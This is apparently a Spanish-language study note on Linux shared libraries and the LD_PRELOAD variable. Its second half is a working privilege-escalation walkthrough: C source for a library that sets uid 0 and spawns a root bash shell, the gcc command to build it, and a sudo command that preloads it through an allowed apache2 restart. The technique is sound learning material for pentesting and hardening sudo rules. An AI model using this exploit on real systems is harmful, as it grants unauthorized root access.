
Es comun que en Linux se usen bibliotecas de objetos compartidos enlazadas dinamicamente. Estas tienen codigo compilado y otros datos que se usan para evitar tener que reescribir las mismas piezas de codigo en varios programas

2 tipos de bibliotecas:

- Bibliotecas estaticas: indicadas por extension .a
- Bibliotecas enlazadas dinamicamente: indicadas por extension .so

Cuando se compila un programa, las bibliotecas estaticas se convierten en parte del programa y no se pueden alterar pero las dinamicas pueden ser modificadas para controlar la ejecucion del programa

Hay muchos metodos para que el sistema sepa donde buscarlas:

- -rpath o -rpath-link: al compilar un programa
- variables LD_RUN_PATH o LD_LIBRARY_PATH
- Directorio por defecto /lib o /usr/lib 
- Especificar un directorio en el archivo de conf /etc/ld.so.conf

La variable LD_PRELOAD carga bibliotecas antes de ejecutar un binario

- Para ver los objetos compartidos que son necesarios para la ejecucion de un binario:

```
ld COMANDO/BINARIO
```

## Escalada de privs con LD_PRELOAD

1. Necesitamos un usuario con privs sudo para algun binario

```
sudo -l
```
![[Pasted image 20260921160241.png]]

Este usuario tiene derechos para reiniciar el servicio Apache como root, pero como esto `NO` es un [GTFOBin](https://gtfobins.github.io/#apache) y la entrada de `/etc/sudoers` está escrita especificando la ruta absoluta, no podría ser utilizado para escalar privilegios

2. Creamos un archivo .so (biblioteca) con el siguiente codigo

```
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 
#include <unistd.h> 

void _init() { 
unsetenv("LD_PRELOAD"); 
setgid(0); 
setuid(0); 
system("/bin/bash"); 
}
```
![[Pasted image 20260921160345.png]]

3. Compilamos

```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
![[Pasted image 20260921160431.png]]

4. Escalamos privs usando el comando que podemos usar como sudo y especificando la ruta de la biblioteca maliciosa con LD_PRELOAD

```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
![[Pasted image 20260921160514.png]]
